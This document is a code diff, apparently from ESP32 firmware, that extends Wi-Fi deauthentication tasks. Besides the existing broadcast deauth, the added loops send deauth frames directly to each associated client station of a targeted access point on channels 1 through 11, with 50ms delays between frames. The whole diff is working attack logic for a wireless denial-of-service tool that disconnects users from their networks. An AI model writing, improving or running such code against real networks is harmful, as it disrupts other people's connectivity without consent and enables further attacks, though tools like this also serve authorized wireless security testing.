@@ -1417,7 +1417,11 @@ void wifi_deauth_task(void *param) {
                     for (int y = 1; y < 12; y++) {
                         uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                         wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                        // Increase delay to 50ms
+                        for (int j = 0; j < station_count; j++) {
+                            if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
+                                wifi_manager_broadcast_deauth(ap_info[i].bssid, y, station_ap_list[j].station_mac);
+                            }
+                        }
                         vTaskDelay(pdMS_TO_TICKS(50));
                     }
                 }
@@ -1427,7 +1431,11 @@ void wifi_deauth_task(void *param) {
                 for (int y = 1; y < 12; y++) {
                     uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                     wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                    // Increase delay to 50ms
+                    for (int j = 0; j < station_count; j++) {
+                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
+                            wifi_manager_broadcast_deauth(ap_info[i].bssid, y, station_ap_list[j].station_mac);
+                        }
+                    }
                     vTaskDelay(pdMS_TO_TICKS(50));
                 }
             }
@@ -2348,7 +2356,12 @@ void wifi_auto_deauth_task(void *Parameter) {
 
                     uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                     wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                    vTaskDelay(pdMS_TO_TICKS(25)); // 25ms delay between deauth packets
+                    for (int j = 0; j < station_count; j++) {
+                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
+                            wifi_manager_broadcast_deauth(ap_info[i].bssid, y, station_ap_list[j].station_mac);
+                        }
+                    }
+                    vTaskDelay(pdMS_TO_TICKS(50));
                 }
                 vTaskDelay(pdMS_TO_TICKS(50)); // 50ms delay between APs
             }
